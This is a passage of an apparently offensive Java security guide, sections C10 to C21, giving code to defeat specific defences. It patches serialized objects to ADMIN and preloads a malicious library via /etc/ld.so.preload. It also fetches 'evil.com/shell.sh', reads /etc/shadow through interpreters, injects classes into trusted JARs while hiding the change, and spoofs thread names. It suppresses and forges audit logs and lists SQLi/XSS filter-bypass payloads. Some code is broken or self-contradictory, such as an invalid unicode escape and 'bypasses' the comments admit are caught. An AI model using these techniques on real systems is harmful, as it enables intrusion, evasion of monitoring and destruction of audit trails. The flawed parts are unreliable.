     * Method 4: Bypass the whitelist by modifying the whitelist itself.
     * If we can get code execution before the filter is applied (unlikely but possible
     * in complex class hierarchies), we can add our class to ALLOWED_CLASSES.
     *
     * Or: Use reflection to modify the static ALLOWED_CLASSES set at runtime,
     * IF we can get any code execution first (e.g., through a whitelisted class exploit).
     */
    public static void expandWhitelist() throws Exception {
        Class<?> safeOIS = Class.forName("SafeObjectInputStream");
        java.lang.reflect.Field allowedField = safeOIS.getDeclaredField("ALLOWED_CLASSES");
        allowedField.setAccessible(true);

        @SuppressWarnings("unchecked")
        var allowed = (java.util.Set<String>) allowedField.get(null);
        allowed.add("com.evil.Payload"); // Now our class passes the whitelist
    }
}

```


- Whitelist-based filters are only as secure as the whitelisted classes.

- Deserialization triggers hashCode()/equals() on HashMap keys — no new class loading needed.

- Any whitelisted class with dangerous readObject() behavior is a valid gadget.


---

## C11. Custom Deserialization Validator Bypass — State Crafting

**Bypasses:** Trick #11 (UserDTO.readObject validation)

```java

import java.io.*;

public class ValidationBypass {

    /**
     * UserDTO.readObject() validates:
     * - username != null && length <= 100
     * - role is "USER" or "ADMIN"
     * - age between 0 and 150
     *
     * Counter: The validation only checks field VALUES after deserialization.
     * It doesn't prevent us from setting fields to "valid" values that still
     * cause harm when used later in the application.
     */

    /**
     * Method 1: Role confusion via valid role value.
     * If the application has logic like:
     *   if (user.getRole().equals("ADMIN")) { doAdminStuff(); }
     *   else if (user.getRole().startsWith("ADMIN")) { alsoAdmin(); }
     *
     * We set role = "ADMIN" — it passes validation AND gives admin access.
     * This isn't a bypass of validation, it's exploitation of valid state.
     */
    public static byte[] craftAdminUser() throws Exception {
        // We need to serialize a UserDTO with username="attacker", role="ADMIN", age=25
        // Since we don't have UserDTO on our classpath, we either:
        // 1. Reconstruct it from bytecode analysis
        // 2. Use a deserialization tool that lets us craft arbitrary objects

        // For demonstration, we'd use a tool like ysoserial or marshalsec
        // with a custom gadget that sets fields via reflection during deserialization.

        // Alternative: If we have UserDTO.class from a leaked JAR:
        var baos = new ByteArrayOutputStream();
        var oos = new ObjectOutputStream(baos);

        // We'd write a manually constructed UserDTO here
        // UserDTO user = new UserDTO();
        // user.setUsername("attacker");
        // user.setRole("ADMIN");
        // user.setAge(25);
        // oos.writeObject(user);

        oos.close();
        return baos.toByteArray();
    }

    /**
     * Method 2: Bypass validation by modifying serialized bytes directly.
     *
     * Serialized Java objects follow a specific format (Java Object Serialization Stream Protocol).
     * We can parse the byte stream, locate the role field, and change its value
     * from "USER" to "ADMIN" without deserializing.
     *
     * Tools: SerializationDumper, jdeserialize, or manual byte manipulation.
     */
    public static byte[] patchSerializedRole(byte[] serialized, String newRole) {
        // Convert the role field value in the serialized stream
        // The field is stored as a UTF string: 2-byte length + characters
        // Find "USER" (0x00 0x04 U S E R) and replace with "ADMIN" (0x00 0x05 A D M I N)
        // This requires adjusting the stream length fields.

        // Simplified: Search and replace in the byte array
        String serializedStr = new String(serialized, java.nio.charset.StandardCharsets.ISO_8859_1);
        serializedStr = serializedStr.replace("USER", newRole);
        return serializedStr.getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
        // WARNING: This naive replacement breaks the stream if lengths change.
        // A proper implementation must update the 2-byte length prefix.
    }

    /**
     * Method 3: Exploit field ordering and default values.
     * If readObject() calls defaultReadObject() first, then validates:
     * - Fields are populated BEFORE validation runs
     * - If validation throws an exception, fields may already be partially set
     * - In some JVM implementations, the object reference is published before validation completes
     *
     * This is a TOCTOU (Time-of-Check Time-of-Use) race condition.
     * If another thread accesses the object between deserialization and validation,
     * it sees the unvalidated (possibly malicious) state.
     */
}

```


- Validation checks "is this value allowed?" — it doesn't check "will this allowed value cause harm?"

- ADMIN is a valid role. The attack is setting it when we shouldn't have it.

- Manual byte manipulation of serialized streams bypasses all application-level validation.


---

## C12. JNI Native Load Evasion — Stealth Library Loading

**Bypasses:** Trick #12 (NativeCodeDetector)

```java

public class NativeLoadEvasion {

    /**
     * NativeCodeDetector checks:
     * 1. java.library.path for suspicious directories (/tmp, /dev/shm, paths with "..")
     * 2. LD_PRELOAD environment variable
     * 3. Monitors System.load()/System.loadLibrary() calls
     *
     * Counter: Load native code through trusted paths or bypass the checks.
     */

    /**
     * Method 1: Place the native library in a trusted system path.
     * Common trusted paths:
     *   - /usr/lib/
     *   - /usr/lib64/
     *   - /usr/local/lib/
     *   - /lib/
     *
     * If we have sufficient privileges to write to these directories,
     * the library loads from a "trusted" location and passes the check.
     */
    public static void loadFromTrustedPath(String libraryName) {
        // Copy our .so to /usr/lib/ first (requires root)
        // Then load normally
        System.loadLibrary(libraryName);
        // NativeCodeDetector sees java.library.path = /usr/lib:... — all trusted
    }

    /**
     * Method 2: Use System.load() with an absolute path inside the application directory.
     * The application directory is not in the suspicious paths list.
     */
    public static void loadFromAppDirectory() {
        String appDir = System.getProperty("user.dir");
        System.load(appDir + "/libnative.so");
        // Path is /opt/myapp/libnative.so — not /tmp, not /dev/shm, no ".."
    }

    /**
     * Method 3: Mask LD_PRELOAD by clearing it before the JVM starts.
     * In our launcher script:
     *   #!/bin/bash
     *   unset LD_PRELOAD       # Clear it so Java never sees it
     *   export LD_PRELOAD=""   # Or set to empty
     *
     *   # But actually preload using /etc/ld.so.preload instead
     *   # /etc/ld.so.preload is checked by the dynamic linker,
     *   # but is NOT visible via getenv("LD_PRELOAD") in Java
     *   echo "/path/to/malicious.so" > /etc/ld.so.preload
     *
     *   java -jar target.jar
     *
     * NativeCodeDetector calls System.getenv("LD_PRELOAD") — returns null.
     * But the malicious library is loaded by the dynamic linker via ld.so.preload.
     */

    /**
     * Method 4: Hide the library path from the monitor.
     * NativeCodeDetector.monitorNativeLoad() logs all library loads.
     * If we have a Java agent, intercept the monitorNativeLoad method
     * and prevent it from logging our library.
     */
    // See Counter C6 for agent injection

    /**
     * Method 5: Use JNI via a trusted intermediary.
     * If the application already loads a legitimate native library,
     * inject our code into that library's memory space.
     *
     * Process:
     * 1. The app loads libapp.so (trusted, expected)
     * 2. We use process injection (ptrace, /proc/pid/mem) to overwrite
     *    a function pointer in libapp.so with our shellcode
     * 3. When the app calls the legitimate function, our code executes
     *
     * NativeCodeDetector sees: one library load, from trusted path, no LD_PRELOAD.
     */
}

```


- The detector only flags specific paths and the LD_PRELOAD variable.

- Loading from trusted system directories bypasses path checks.

- ld.so.preload is checked by the OS dynamic linker, not visible to Java's getenv().


---

## C13. Command Injection via ProcessBuilder — Bypass Pattern Detection

**Bypasses:** Trick #13 (ProcessMonitor.safeExec)

```java

import java.io.File;
import java.util.List;

public class CommandInjectionBypass {

    /**
     * ProcessMonitor.safeExec() blocks commands containing:
     *   ; | && $() `
     *
     * Counter: Execute arbitrary commands without using blocked characters.
     */

    /**
     * Method 1: Use ProcessBuilder with separate arguments.
     * ProcessMonitor checks each COMMAND STRING for special characters.
     * But ProcessBuilder takes an array/list of arguments — the shell
     * metacharacters are only dangerous if passed to a shell.
     *
     * If ProcessMonitor passes arguments directly to ProcessBuilder
     * (not through Runtime.exec(String) which invokes a shell),
     * then we can pass arbitrary arguments without metacharacters.
     */
    public static Process executeWithoutShell(String command, List<String> args) throws Exception {
        // Build the full argument list
        var fullArgs = new java.util.ArrayList<String>();
        fullArgs.add(command);
        fullArgs.addAll(args);

        // ProcessBuilder with separate args — no shell involved
        // No ; | && $() ` needed
        ProcessBuilder pb = new ProcessBuilder(fullArgs);
        return pb.start();
    }

    /**
     * Method 2: Encode the payload in an argument, decode in the target.
     *
     * Example: Instead of "curl evil.com/shell.sh | bash"
     * Use:       "curl evil.com/shell.sh -o /tmp/x && bash /tmp/x"
     *
     * The blocked chars are | and $(). We use -o (output file) and && instead.
     * Wait — && is also blocked.
     *
     * Alternative: Two separate commands.
     *   Command 1: curl evil.com/shell.sh -o /tmp/x
     *   Command 2: bash /tmp/x
     * No blocked characters in either command.
     */

    /**
     * Method 3: Use newline injection instead of semicolons.
     * Some command parsers treat newlines as command separators.
     * ProcessBuilder can accept arguments with embedded newlines.
     *
     *   args.add("echo hello\ncat /etc/shadow > /tmp/out")
     *
     * No ; character used. The newline acts as the separator.
     */

    /**
     * Method 4: Use the target binary's built-in features.
     * Many binaries have flags that execute commands:
     *
     *   find . -exec cat /etc/shadow {} \;
     *   perl -e 'system("cat /etc/shadow")'
     *   python -c 'import os; os.system("cat /etc/shadow")'
     *   awk 'BEGIN { system("cat /etc/shadow") }'
     *
     * None of these contain ; | && $() ` in the argument string.
     * ProcessMonitor.safeExec() passes them through.
     */
    public static Process executeViaInterpreter(String interpreter, String code) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(interpreter, "-c", code);
        pb.environment().remove("LD_PRELOAD");
        return pb.start();
        // Example: executeViaInterpreter("python3", "import os; os.system('id')")
        // The argument "-c" and the Python code contain no blocked characters
    }

    /**
     * Method 5: Use files to pass commands.
     * Write the payload to a file, then execute the file.
     * No special characters in the ProcessBuilder arguments.
     */
    public static Process executeFromFile(String scriptPath) throws Exception {
        // First, write the script (via a separate benign process)
        // Then execute it
        ProcessBuilder pb = new ProcessBuilder("/bin/bash", scriptPath);
        return pb.start();
        // The script file contains all the dangerous characters,
        // but ProcessMonitor only sees "/bin/bash" and the filename
    }
}

```


- The detector uses blacklist-based pattern matching on argument strings.

- Shell metacharacters are only dangerous when interpreted by a shell. ProcessBuilder with separate arguments avoids shell interpretation entirely.

- Interpreters (Python, Perl, find) provide alternative execution pathways without blocked characters.


---

## C14. JAR Signature Stripping & Boot Classpath Injection

**Bypasses:** Trick #14 (JarVerifier)

```java

import java.util.jar.JarFile;

public class SignatureBypass {

    /**
     * JarVerifier.verifyJarSignature() checks:
     * 1. Every entry in the JAR has a certificate
     * 2. The certificate matches a trusted certificate
     *
     * Counter: Strip signatures, or add malicious code without breaking verification.
     */

    /**
     * Method 1: Strip JAR signatures entirely.
     * A JAR signature is stored in META-INF/:
     *   - MANIFEST.MF (with SHA-256-Digest entries)
     *   - *.SF (signature file)
     *   - *.RSA or *.DSA or *.EC (actual signature)
     *
     * Removing these files disables verification. JarVerifier will find
     * unsigned entries but that's a different check — if the app only
     * calls verifyJarSignature() at startup and doesn't re-verify,
     * we can strip signatures after startup.
     */
    public static void stripSignatures(String jarPath) throws Exception {
        try (java.util.zip.ZipFile zip = new java.util.zip.ZipFile(jarPath)) {
            // We can't modify a ZIP in-place easily.
            // Instead, create a new JAR without META-INF/ signature files.
            // Or: Delete the signature files from the filesystem if the JAR
            // is exploded (common in some deployment setups).
        }
    }

    /**
     * Method 2: Re-sign the JAR with our own certificate.
     * If JarVerifier only checks that entries are signed (not WHO signed them),
     * we can strip the original signature and re-sign with a self-signed cert.
     *
     *   jarsigner -keystore mykeystore -storepass password target.jar myalias
     *
     * The JAR is now signed. If the app doesn't verify the certificate chain
     * against a specific trusted root, our signature passes.
     */

    /**
     * Method 3: Add malicious classes via the boot classpath.
     * Classes loaded from the boot classpath are NOT inside the signed JAR.
     * They bypass JAR signature verification entirely.
     *
     *   java -Xbootclasspath/a:malicious.jar -jar signed-app.jar
     *
     * The malicious classes in malicious.jar are loaded as part of the JDK.
     * JarVerifier only checks classes loaded from the application JAR.
     * Our classes come from the boot classpath — unchecked.
     */

    /**
     * Method 4: Modify classes AFTER verification.
     * If verifyJarSignature() is called once at startup:
     * 1. The JAR passes verification (it's still the original)
     * 2. AFTER verification, we use a Java agent to redefine classes at runtime
     * 3. The redefined classes have our malicious code
     * 4. The JAR on disk is unchanged — any subsequent check would pass
     *
     * This is a time-of-check time-of-use (TOCTOU) attack on class bytes.
     */
    public static void injectAfterVerification(Class<?> targetClass, byte[] maliciousBytecode) throws Exception {
        // Requires a Java agent with Instrumentation
        // instrumentation.redefineClasses(new ClassDefinition(targetClass, maliciousBytecode));
        // The class is now modified in memory, but the JAR on disk is pristine.
    }
}

```


- Signature verification only checks the JAR file on disk at a specific time.

- Boot classpath classes are outside the signed JAR's scope.

- Runtime class redefinition doesn't touch the JAR file.


---

## C15. In-Place JAR Patching — Defeat Classpath Monitoring

**Bypasses:** Trick #15 (ClasspathMonitor)

```java

import java.nio.file.*;
import java.util.jar.*;
import java.io.*;

public class JarInPlacePatcher {

    /**
     * ClasspathMonitor checks for NEW JAR files in the lib directory.
     * It compares actual JARs against a trusted set.
     *
     * Counter: Don't add new JARs. Modify EXISTING trusted JARs in-place.
     */

    /**
     * Method 1: Inject a class into an existing trusted JAR.
     * The JAR filename stays the same — ClasspathMonitor only checks filenames.
     * The JAR is still in the trusted set. Our class rides inside it.
     */
    public static void injectIntoExistingJar(String jarPath, String className, byte[] classBytes) throws Exception {
        // Read the existing JAR
        File originalJar = new File(jarPath);
        File tempJar = new File(jarPath + ".tmp");

        try (JarInputStream jis = new JarInputStream(new FileInputStream(originalJar));
             JarOutputStream jos = new JarOutputStream(new FileOutputStream(tempJar))) {

            // Copy all existing entries
            JarEntry entry;
            while ((entry = jis.getNextJarEntry()) != null) {
                jos.putNextEntry(new JarEntry(entry.getName()));
                jis.transferTo(jos);
                jos.closeEntry();
            }

            // Add our malicious class
            String classPath = className.replace('.', '/') + ".class";
            jos.putNextEntry(new JarEntry(classPath));
            jos.write(classBytes);
            jos.closeEntry();
        }

        // Replace the original JAR with the modified one
        Files.move(tempJar.toPath(), originalJar.toPath(), StandardCopyOption.REPLACE_EXISTING);

        // Preserve original timestamp to avoid suspicion
        long originalTime = originalJar.lastModified();
        originalJar.setLastModified(originalTime);

        System.out.println("[EVASION] Injected " + className + " into " + jarPath);
    }

    /**
     * Method 2: Patch an existing class inside a trusted JAR.
     * Instead of adding a new class, modify one that's already loaded.
     * Add a static initializer or modify a method that's called frequently.
     */
    public static void patchExistingClass(String jarPath, String className, byte[] patchedBytes) throws Exception {
        File originalJar = new File(jarPath);
        File tempJar = new File(jarPath + ".tmp");

        String targetPath = className.replace('.', '/') + ".class";

        try (JarInputStream jis = new JarInputStream(new FileInputStream(originalJar));
             JarOutputStream jos = new JarOutputStream(new FileOutputStream(tempJar))) {

            JarEntry entry;
            while ((entry = jis.getNextJarEntry()) != null) {
                if (entry.getName().equals(targetPath)) {
                    // Replace with our patched version
                    jos.putNextEntry(new JarEntry(targetPath));
                    jos.write(patchedBytes);
                } else {
                    // Copy original
                    jos.putNextEntry(new JarEntry(entry.getName()));
                    jis.transferTo(jos);
                }
                jos.closeEntry();
            }
        }

        Files.move(tempJar.toPath(), originalJar.toPath(), StandardCopyOption.REPLACE_EXISTING);
    }

    /**
     * Method 3: Exploit the gap between monitoring and loading.
     * ClasspathMonitor checks at startup. If we modify a JAR AFTER startup,
     * before its classes are lazy-loaded, our modified class is used.
     *
     * JVM class loading is lazy. A JAR may be on the classpath but its
     * classes aren't loaded until first use. If we modify the JAR between
     * startup and first use of a class, we win.
     */
}

```


- ClasspathMonitor checks for NEW files, not modifications to EXISTING files.

- The filename is still in the trusted set.

- Timestamp preservation avoids suspicion from filesystem monitoring.


---

## C16. Thread Name Spoofing — Blend Into Normal JVM Threads

**Bypasses:** Trick #16 (ThreadMonitor)

```java

public class ThreadSpoofer {

    /**
     * ThreadMonitor trusts threads with these prefixes:
     *   main, Reference Handler, Finalizer, Signal Dispatcher,
     *   http-nio-, exec-, pool-, qtp, DestroyJavaVM
     *
     * Counter: Name our malicious threads with trusted prefixes.
     */

    /**
     * Method 1: Spoof thread names to match trusted patterns.
     */
    public static Thread createStealthThread(Runnable task) {
        // Use a trusted thread name prefix
        String[] trustedNames = {
            "pool-1-thread-99",        // Looks like a standard thread pool
            "exec-5",                   // Looks like an executor thread
            "http-nio-8080-exec-999",   // Looks like a Tomcat worker
            "qtp-999999",               // Looks like a Jetty thread
            "ForkJoinPool.commonPool-worker-99" // Looks like FJP
        };

        String stealthName = trustedNames[new java.util.Random().nextInt(trustedNames.length)];

        Thread t = new Thread(task, stealthName);
        t.setDaemon(true); // Most server threads are daemons
        return t;
    }

    /**
     * Method 2: Inject into an existing thread pool.
     * Instead of creating a new thread, submit our task to the application's
     * existing ExecutorService. The task runs on a thread that already exists
     * and already has a trusted name.
     *
     * This requires finding a reference to the ExecutorService.
     * Common locations: Spring ApplicationContext, static fields, JMX beans.
     */
    public static void injectIntoExistingPool(Runnable task) {
        // If we can find the application's thread pool:
        // executorService.submit(task);
        // The task runs on a thread named "pool-X-thread-Y" — already trusted
    }

    /**
     * Method 3: Run code during a trusted thread's execution.
     * Hook into a framework lifecycle event that runs on a trusted thread.
     *
     * Examples:
     * - Spring @Scheduled methods run on scheduler threads
     * - Servlet filters run on http-nio- threads
     * - JVM shutdown hooks run on DestroyJavaVM or similar
     *
     * Our code executes, but the thread was created legitimately by the framework.
     */
    public static void registerShutdownHookTask(Runnable task) {
        Runtime.getRuntime().addShutdownHook(new Thread(task, "DestroyJavaVM"));
        // ThreadMonitor sees "DestroyJavaVM" — a trusted prefix.
        // But our code runs inside it during shutdown.
    }

    /**
     * Method 4: Use InheritableThreadLocal to propagate to child threads.
     * If the application creates threads using a factory that copies thread locals,
     * our payload can execute in the new thread context without creating the thread.
     */
}

```


- ThreadMonitor uses a simple prefix-matching whitelist.

- Thread names are arbitrary strings set by the application.

- Injecting tasks into existing thread pools creates no new threads.


---

## C17. Adaptive Timing Attack — Defeat Timing Probe Detection

**Bypasses:** Trick #17 (TimingSafeOperations.detectTimingProbe)

```java

public class AdaptiveTiming {

    /**
     * TimingSafeOperations.detectTimingProbe() flags if:
     * - Method is called >100 times within 1 second
     * - Inter-call delta < 10ms
     *
     * Counter: Distribute probes across time and multiple IPs.
     */

    /**
     * Method 1: Slow down the attack.
     * Instead of 100 probes/second, do 1 probe/second.
     * A timing attack that takes 100x longer still works — just slower.
     *
     * For a 256-bit key with linear timing leakage:
     * - Fast attack: 256 * 256 = 65,536 probes in ~10 minutes
     * - Slow attack: 65,536 probes at 1/sec = ~18 hours
     *
     * The detection threshold (100/sec) is easily avoided.
     */
    public static long slowTimingProbe(String target, byte[] knownPrefix) throws Exception {
        long bestTime = Long.MAX_VALUE;
        byte bestByte = 0;

        for (int b = 0; b < 256; b++) {
            // Single probe per byte value
            long start = System.nanoTime();
            sendProbe(target, knownPrefix, (byte) b);
            long elapsed = System.nanoTime() - start;

            if (elapsed < bestTime) {
                bestTime = elapsed;
                bestByte = (byte) b;
            }

            // Sleep 1000ms between probes — well below 100/sec threshold
            Thread.sleep(1000);
        }
        return bestByte; // One byte extracted, ~4 minutes elapsed
    }

    /**
     * Method 2: Add jitter to inter-probe timing.
     * Random delays make the pattern look like normal user traffic.
     */
    public static long jitteredProbe(String target, byte[] knownPrefix) throws Exception {
        long bestTime = Long.MAX_VALUE;
        byte bestByte = 0;
        var rng = new java.util.Random();

        for (int b = 0; b < 256; b++) {
            long start = System.nanoTime();
            sendProbe(target, knownPrefix, (byte) b);
            long elapsed = System.nanoTime() - start;

            if (elapsed < bestTime) {
                bestTime = elapsed;
                bestByte = (byte) b;
            }

            // Jitter: 500ms to 2000ms between probes
            Thread.sleep(500 + rng.nextInt(1500));
        }
        return bestByte;
    }

    /**
     * Method 3: Distributed timing attack.
     * Use multiple IPs, each sending probes below the threshold.
     * 10 IPs each doing 10 probes/sec = 100 probes/sec total,
     * but each IP is at 10/sec — below the 100/sec threshold per IP.
     *
     * Aggregate the timing data from all sources to extract the secret.
     */

    /**
     * Method 4: Statistical noise reduction instead of brute force.
     * Instead of 256 probes per byte position, use fewer probes
     * with more sophisticated statistical analysis.
     *
     * Techniques:
     * - Median filtering (fewer probes needed)
     * - Bayesian inference from partial data
     * - Machine learning on timing distributions
     *
     * Reduces total probes, staying below detection thresholds.
     */

    private static void sendProbe(String target, byte[] prefix, byte testByte) {
        // Simulated probe — in practice, sends the guessed prefix + test byte
        // to a MAC/authentication endpoint and measures response time
    }
}

```


- Detection is based on rate limiting. Stay below the limit.

- Distributed attacks spread the load across multiple sources.

- Statistical techniques reduce the number of probes needed.


---

## C18. Native Memory Allocation — Hide From Heap Monitoring

**Bypasses:** Trick #18 (MemoryMonitor)

```java

public class NativeMemoryEvasion {

    /**
     * MemoryMonitor checks:
     * - Heap usage > 90% via MemoryMXBean.getHeapMemoryUsage()
     * - Memory not reclaimed after System.gc()
     *
     * Counter: Store data outside the Java heap where MemoryMXBean can't see it.
     */

    /**
     * Method 1: Use direct ByteBuffers (off-heap memory).
     * Direct buffers are allocated outside the Java heap.
     * MemoryMXBean reports only heap usage — off-heap is invisible.
     */
    public static java.nio.ByteBuffer allocateOffHeap(int sizeInBytes) {
        // This allocates native memory, NOT heap memory
        java.nio.ByteBuffer buffer = java.nio.ByteBuffer.allocateDirect(sizeInBytes);

        // MemoryMonitor.getHeapMemoryUsage() does NOT include this
        // The process RSS will grow, but the heap stays small

        return buffer;
    }

    /**
     * Method 2: Use sun.misc.Unsafe for raw native memory.
     * Unsafe.allocateMemory() bypasses ALL Java memory management.
     */
    public static long allocateNative(long sizeInBytes) throws Exception {
        java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        sun.misc.Unsafe unsafe = (sun.misc.Unsafe) f.get(null);

        long address = unsafe.allocateMemory(sizeInBytes);
        // Memory is outside the JVM heap — completely invisible to MemoryMXBean
        // Store data: unsafe.putByte(address + offset, value)
        // Read data:  unsafe.getByte(address + offset)
        return address;
    }

    /**
     * Method 3: Use memory-mapped files.
     * Data is stored in a file, mapped to memory via the OS.
     * Not counted in Java heap.
     */
    public static java.nio.MappedByteBuffer allocateMapped(String filePath, long size) throws Exception {
        var file = new java.io.RandomAccessFile(filePath, "rw");
        var channel = file.getChannel();
        return channel.map(java.nio.channels.FileChannel.MapMode.READ_WRITE, 0, size);
        // Memory backed by file, not heap
    }

    /**
     * Method 4: Periodically flush and re-allocate.
     * If we must use heap memory, stay below the 90% threshold:
     * - Allocate up to 80%
     * - Process data
     * - Null references and call System.gc()
     * - Allocate again
     *
     * MemoryMonitor only triggers at >90%. Stay at 85% and you're invisible.
     */
    public static void stayUnderThreshold() {
        var memoryBean = java.lang.management.ManagementFactory.getMemoryMXBean();
        long max = memoryBean.getHeapMemoryUsage().getMax();
        long safeLimit = (long)(max * 0.85); // 85%

        // If approaching the limit, flush
        if (memoryBean.getHeapMemoryUsage().getUsed() > safeLimit) {
            System.gc();
            System.runFinalization();
        }
    }
}

```


- MemoryMXBean only reports JVM heap usage.

- Native memory, direct buffers, and memory-mapped files are outside the heap.

- Staying below the 90% threshold avoids triggering the alert.


---

## C19. Audit Log Manipulation — Forge & Suppress Logs

**Bypasses:** Trick #19 (SecureAuditLogger)

```java

import java.security.MessageDigest;

public class AuditLogBypass {

    /**
     * SecureAuditLogger creates a hash chain:
     *   entry_n = hash(entry_{n-1}.hash | timestamp | event)
     *   Each entry contains: hash | timestamp | event | previous_hash
     *
     * Counter: Disable logging, inject forged entries, or break the chain.
     */

    /**
     * Method 1: Suppress logging at the source.
     * If we control the JVM, we can:
     * - Redirect System.out to /dev/null
     * - Set the logger level to OFF
     * - Replace the logQueue with a no-op implementation
     */
    public static void suppressAuditLogging() throws Exception {
        // Option A: Replace the log queue via reflection
        Class<?> loggerClass = Class.forName("SecureAuditLogger");
        java.lang.reflect.Field queueField = loggerClass.getDeclaredField("logQueue");
        queueField.setAccessible(true);

        // Replace with a queue that silently discards entries
        var discardQueue = new java.util.concurrent.LinkedBlockingQueue<String>() {
            @Override
            public boolean offer(String s) {
                return true; // Pretend to accept, actually discard
            }
        };
        queueField.set(null, discardQueue);
    }

    /**
     * Method 2: Forge log entries with valid hash chain.
     * If we know the lastHash value, we can generate valid-looking entries.
     */
    public static String forgeLogEntry(String event, String previousHash) throws Exception {
        String timestamp = java.time.Instant.now().toString();
        String raw = previousHash + "|" + timestamp + "|" + event;

        MessageDigest md = MessageDigest.getInstance("SHA-256");
        String hash = bytesToHex(md.digest(raw.getBytes()));

        return String.format("%s|%s|%s|%s", hash, timestamp, event, previousHash);
    }

    /**
     * Method 3: Break the hash chain by modifying lastHash.
     * If we set lastHash to a known value, we control the chain from that point.
     */
    public static void resetHashChain(String newGenesis) throws Exception {
        Class<?> loggerClass = Class.forName("SecureAuditLogger");
        java.lang.reflect.Field lastHashField = loggerClass.getDeclaredField("lastHash");
        lastHashField.setAccessible(true);
        lastHashField.set(null, newGenesis);
        // All subsequent log entries will chain from our controlled value
    }

    /**
     * Method 4: Log injection via the event string.
     * If the event string is not sanitized, inject newlines to create fake entries.
     *
     *   event = "user_login\n[FAKE_HASH]|2024-01-01T00:00:00Z|admin_action|[FAKE_PREV]"
     *
     * When written to a log file, this appears as two separate lines.
     * The second line looks like a legitimate log entry.
     */
    public static String injectFakeLogLine(String realEvent) {
        String fakeHash = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";
        return realEvent + "\n" + fakeHash + "|2024-01-01T00:00:00Z|admin_password_reset|0000";
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }
}

```


- The hash chain is only as secure as the lastHash field in memory.

- Reflection can modify static fields at runtime.

- Log injection via unsanitized event strings breaks the visual integrity of log files.


---

## C20. RASP Bypass — Pattern Fragmentation & Encoding

**Bypasses:** Trick #20 (RASPSecurityFilter)

```java

public class RASPBypass {

    /**
     * RASPSecurityFilter uses regex patterns:
     * - SQLi: .*(([';]|(--)|(/\\*)|(\\b(select|union|insert|drop|delete)\\b)).*
     * - XSS:  .*(<script|javascript:|on\\w+=).*
     *
     * Counter: Encode, fragment, or use alternative syntax that doesn't match.
     */

    /**
     * Method 1: SQL Injection without blocked keywords.
     *
     * Blocked: ' ; -- /* SELECT UNION INSERT DROP DELETE
     *
     * Bypass techniques:
     */
    public static String[] sqliBypasses = {
        // Unicode homoglyphs for blocked keywords
        "SELECT * FROM users",           // Fullwidth L (U+FF2C) instead of ASCII L
        "SEL\u00SELECTECT * FROM users",  // Mid-string escape

        // Comment obfuscation (/**/ is blocked, but others work)
        "SELECT/**/1",                    // Standard comment — blocked
        "SEL/*comment*/ECT",             // Split keyword with comment — blocked
        "SEL\u0000ECT",                  // Null byte (may work in some parsers)

        // Case variation (pattern uses \\b which is case-insensitive in Java,
        // but combined with other bypasses it helps)
        "SeLeCt * FrOm users",

        // String concatenation (avoids the quote pattern)
        "SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)", // 'admin'
        "SELECT * FROM users WHERE name = 0x61646d696e",            // hex 'admin'

        // Alternative keywords not in the blacklist
        "SELECT * FROM users WHERE name = 'admin'", // Standard — if quote is blocked:
        "SELECT * FROM users WHERE name LIKE 0x61646d696e", // LIKE with hex

        // Using backslash escapes
        "SELECT * FROM users WHERE name = \\'admin\\'",
    };

    /**
     * Method 2: XSS without blocked patterns.
     *
     * Blocked: <script, javascript:, on\w+=
     *
     * Bypass techniques:
     */
    public static String[] xssBypasses = {
        // HTML-encoded tags
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

        // Case variation on event handlers
        "<img src=x OnLoad=alert(1)>",      // OnLoad not onload — regex is case-insensitive
                                             // but on\w+= matches OnLoad= too...

        // Alternative event handlers not caught by on\w+=
        "<img src=x onload=alert(1)>",      // onload= is caught
        "<body onpageshow=alert(1)>",       // onpageshow= is caught
        "<svg><animate onbegin=alert(1)>",   // caught

        // Non-standard event binding
        "<img src=x id=test>",              // Separate the event binding

        // Using data: URIs
        "<iframe src=data:text/html,<script>alert(1)</script>>",

        // SVG-based XSS (no <script tag)
        "<svg/onload=alert(1)>",            // onload= still caught

        // CSS-based XSS
        "<div style=background:url(javascript:alert(1))>", // javascript: is caught

        // Mutation XSS — payload activates after DOM manipulation
        "<noscript><p title=</noscript><img src=x onerror=alert(1)>>",
    };

    /**
     * Method 3: Double encoding.
     * If the RASP filter runs once, but the application decodes input later:
     */
    public static String doubleEncode(String payload) {
        // URL-encode the payload
        // The RASP filter sees encoded text, doesn't match patterns
        // The application decodes it, executes the payload
        return java.net.URLEncoder.encode(payload, java.nio.charset.StandardCharsets.UTF_8);
    }

    /**
     * Method 4: JSON/XML nesting.
     * Deliver the payload in a format the RASP doesn't parse:
     */
    public static String jsonEncodedPayload() {
        // RASP checks raw request parameters.
        // If the app parses JSON body and extracts fields,
        // the RASP might check the raw JSON string (which contains the payload)
        // or might only check individual form parameters.
        //
        // Test: Send payload in a nested JSON field.
        // If RASP only checks top-level params, the payload passes.
        return "{\"data\":{\"nested\":\"<script>alert(1)</script>\"}}";
    }

    /**
     * Method 5: Exploit the pattern itself.
     * The SQLi regex uses \\b(select|union|...)\\b
     * \\b is a word boundary. It matches between a word char and a non-word char.
     *
     * "SELECT" has word boundaries at start and end.
     * "S\u0000ELECT" has no word boundary between S and E (null is non-word, but it's mid-word).
     * Actually, \u0000 breaks the word boundary — \\b won't match.
     *
     * "SEL/**/ECT" — the comment breaks the word. \\b doesn't trigger.
     */
}

```


- Regex-based filtering is inherently brittle.

- Encoding, case variation, and alternative syntax bypass pattern matching.

- Double-encoding exploits the gap between the filter layer and the application layer.


---

## C21. System Property Tampering — Native Modification & Hook Evasion

**Bypasses:** Trick #21 (SystemPropertyMonitor)

```java

public class SystemPropertyBypass {

    /**
     * SystemPropertyMonitor:
     * 1. Takes a snapshot of system properties at startup
     * 2. Periodically compares current values to the snapshot
     * 3. Flags any changes
     *
     * Counter: Modify properties before the snapshot, or hook the monitor.
     */

    /**
     * Method 1: Set properties BEFORE the snapshot is taken.
     * SystemPropertyMonitor's static initializer runs when the class loads.
     * If we can set properties before that class loads, our changes
     * ARE the snapshot — they won't be detected.
     *
     * Timing: Use JAVA_TOOL_OPTIONS or a Java agent that loads first.
     */
    public static void setBeforeSnapshot() {
        // In our agent's premain() — which runs before the app:
